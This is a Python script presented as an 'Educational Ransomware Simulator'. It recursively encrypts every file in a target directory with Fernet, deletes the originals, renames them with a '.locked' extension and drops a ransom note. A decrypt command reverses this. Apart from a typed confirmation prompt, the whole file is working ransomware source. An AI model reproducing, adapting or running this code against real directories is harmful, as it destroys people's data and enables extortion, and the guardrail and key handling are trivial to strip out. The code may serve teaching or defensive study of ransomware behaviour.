import os
import argparse
import sys
try:
    from cryptography.fernet import Fernet, InvalidToken
except ImportError:
    print("[-] Error: 'cryptography' library is not installed.")
    print("[*] Please install it using: pip install cryptography")
    sys.exit(1)

# Extension to append to encrypted files
ENCRYPTED_EXT = ".locked"

def generate_key(key_path: str):
    """Generates a secure AES encryption key and saves it to a file."""
    key = Fernet.generate_key()
    with open(key_path, "wb") as key_file:
        key_file.write(key)
    print(f"[+] Encryption key successfully generated and saved to: {key_path}")
    print("[!] DANGER: Do not lose this file, or data will be unrecoverable!")

def load_key(key_path: str) -> bytes:
    """Loads the encryption key from a file."""
    if not os.path.exists(key_path):
        print(f"[-] Error: Key file '{key_path}' not found.")
        sys.exit(1)
    with open(key_path, "rb") as key_file:
        return key_file.read()

def process_file(file_path: str, fernet: Fernet, action: str):
    """Encrypts or decrypts a single file."""
    try:
        with open(file_path, "rb") as file:
            original_data = file.read()

        if action == "encrypt":
            processed_data = fernet.encrypt(original_data)
            new_file_path = file_path + ENCRYPTED_EXT
        elif action == "decrypt":
            processed_data = fernet.decrypt(original_data)
            new_file_path = file_path.replace(ENCRYPTED_EXT, "")
        else:
            return

        # Write the processed data to the new file
        with open(new_file_path, "wb") as file:
            file.write(processed_data)

        # Delete the original file securely
        os.remove(file_path)
        print(f"[+] {action.capitalize()}ed: {os.path.basename(file_path)} -> {os.path.basename(new_file_path)}")

    except InvalidToken:
        print(f"[-] Error: Invalid key or corrupted file -> {file_path}")
    except Exception as e:
        print(f"[-] Error processing {file_path}: {e}")

def traverse_directory(directory: str, fernet: Fernet, action: str):
    """Recursively traverses a directory to process files."""
    if not os.path.isdir(directory):
        print(f"[-] Error: Directory '{directory}' does not exist.")
        sys.exit(1)

    print(f"[*] Starting {action}ion process on directory: {directory}...\n")
    processed_count = 0

    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            
            # Skip the script itself and the key file to avoid self-destruction
            if file in ["ransomware.py", "secret.key"]:
                continue

            # Check extensions to avoid double-encrypting or decrypting normal files
            if action == "encrypt" and not file.endswith(ENCRYPTED_EXT):
                process_file(file_path, fernet, action)
                processed_count += 1
            elif action == "decrypt" and file.endswith(ENCRYPTED_EXT):
                process_file(file_path, fernet, action)
                processed_count += 1

    print(f"\n[*] Process completed. Total files {action}ed: {processed_count}")

def main():
    parser = argparse.ArgumentParser(description="Educational Ransomware Simulator (Applied Cryptography)")
    subparsers = parser.add_subparsers(dest="command", required=True, help="Action to perform")

    # Key generation sub-command
    keygen_parser = subparsers.add_parser("keygen", help="Generate a new encryption key")
    keygen_parser.add_argument("-k", "--key", default="secret.key", help="Path to save the generated key")

    # Encrypt sub-command
    encrypt_parser = subparsers.add_parser("encrypt", help="Encrypt a target directory")
    encrypt_parser.add_argument("-d", "--directory", required=True, help="Target directory to encrypt")
    encrypt_parser.add_argument("-k", "--key", default="secret.key", help="Path to the encryption key")

    # Decrypt sub-command
    decrypt_parser = subparsers.add_parser("decrypt", help="Decrypt a target directory")
    decrypt_parser.add_argument("-d", "--directory", required=True, help="Target directory to decrypt")
    decrypt_parser.add_argument("-k", "--key", default="secret.key", help="Path to the encryption key")

    args = parser.parse_args()

    print("="*60)
    print("☠️  Educational Ransomware Simulator")
    print("="*60)

    if args.command == "keygen":
        generate_key(args.key)
    
    elif args.command == "encrypt":
        # SAFETY GUARDRAIL
        print(f"[!] WARNING: You are about to ENCRYPT all files in '{os.path.abspath(args.directory)}'.")
        confirm = input("[?] Type 'DESTROY' to confirm and proceed: ")
        if confirm != "DESTROY":
            print("[*] Action cancelled by user. Safe exit.")
            sys.exit(0)
            
        key = load_key(args.key)
        fernet = Fernet(key)
        traverse_directory(args.directory, fernet, "encrypt")
        
        # Drop a ransom note
        with open(os.path.join(args.directory, "README_RECOVER_FILES.txt"), "w") as note:
            note.write("YOUR FILES HAVE BEEN ENCRYPTED!\n")
            note.write("This is an educational ransomware simulation.\n")
            note.write("To recover your files, use the 'decrypt' command with the correct secret.key.\n")
        print("\n[!] Ransom note dropped in target directory.")

    elif args.command == "decrypt":
        key = load_key(args.key)
        fernet = Fernet(key)
        traverse_directory(args.directory, fernet, "decrypt")
        
        # Clean up ransom note
        note_path = os.path.join(args.directory, "README_RECOVER_FILES.txt")
        if os.path.exists(note_path):
            os.remove(note_path)

if __name__ == "__main__":
    main()
